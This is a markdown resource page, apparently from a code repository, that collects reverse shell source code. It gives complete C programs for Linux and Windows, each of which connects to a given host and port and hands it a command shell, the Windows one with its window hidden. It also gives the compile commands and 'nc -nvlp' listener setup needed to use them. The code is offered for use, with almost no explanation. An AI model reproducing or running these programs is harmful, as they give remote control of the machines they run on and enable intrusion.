# RESOURCES RELATED TO REVERSE SHELLS


# C Reverse Shells

## [linux revshell c src](https://gist.github.com/loneicewolf/8232aad5722e1e7de9d92932b5a01597)
```c
/*
 * -----set up listener-----
 * clear; nc -nvlp 1234
 * #----------compile---------- ----------set env vars--------------------      -------run it-------
 * clear; rm R;gcc -o R rsh.c && RP="1234" && RH="127.0.0.1" && BIN="/bin/sh"  && ./R $RP $RH $BIN
 * 
 */

#include <stdarg.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
int main(int argc, char **argv) {
int RP = 0; RP = atoi(argv[1]);
char *RH  = argv[2];
char *BIN = argv[3];
int is = 0; is = socket(AF_INET,SOCK_STREAM,0);
struct  sockaddr_in s1;
s1.sin_family      = AF_INET;
s1.sin_port        = htons(RP);
s1.sin_addr.s_addr = inet_addr(RH);
connect( is,(struct sockaddr *) &s1,sizeof(s1));
for(int i=0;i<3;dup2(is,i),i++);
char * const A[] = {BIN,NULL};
execve(BIN,  A, NULL);
return 0;
}
```




## [windows revshell c src](https://gist.github.com/loneicewolf/03d71d65735d8b2d34b5c60b1232d144)
```c
/*
 * code inspired and modified from defcon25,MSDocs,StackOverflow
 * i686-w64-mingw32-gcc -o win_rsh win_rsh.c -lws2_32
 * 
 */

#include <ws2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32")
int main(int argc, char *argv[]){
  WSADATA wsaData;
  SOCKET sock;
  struct sockaddr_in server;
  STARTUPINFOA si = { 0 };
  PROCESS_INFORMATION pi;
  if (argc != 4){
    printf("Usage: %s ipv4  port  binary\n",argv[0]);
    printf("\tExample 1:%s\v10.10.10.48 1234 myapp.exe\n",argv[0]);
    printf("\tExample 2:%s\v10.10.10.1  4444 netsh\n",argv[0]); // pops a reverse 'net shell' to 10.10.10.1 on port 4444      //  (nc -nvlp 4444)
    return EXIT_FAILURE;
  }
  WSAStartup(MAKEWORD(1, 0), &wsaData);
  sock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
  server.sin_family = AF_INET;
  inet_pton(AF_INET, argv[1], &server.sin_addr.s_addr);
  server.sin_port = htons(atoi(argv[2]));
  WSAConnect(sock, (const PSOCKADDR)&server, sizeof(server), NULL, NULL, NULL, NULL);
  si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
  si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
  si.wShowWindow = SW_HIDE;
  si.cb = sizeof(si);
  CreateProcessA(NULL,                /*       [in, optional]      LPCSTR                lpApplicationName,   */
                argv[3],              /*       [in, out, optional] LPSTR                 lpCommandLine,       */
                NULL,                 /*       [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes, */
                NULL,                 /*       [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,  */
                TRUE,                 /*       [in]                BOOL                  bInheritHandles,     */
                CREATE_NEW_CONSOLE,   /*       [in]                DWORD                 dwCreationFlags,     */
                NULL,                 /*       [in, optional]      LPVOID                lpEnvironment,       */
                NULL,                 /*       [in, optional]      LPCSTR                lpCurrentDirectory,  */
                &si,                  /*       [in]                LPSTARTUPINFOA        lpStartupInfo,       */
                &pi                   /*       [out]               LPPROCESS_INFORMATION lpProcessInformation */
              );

  return EXIT_SUCCESS;
}
```




### Internal Links
- 
- 
- 



### External Links
- 
- 
- 





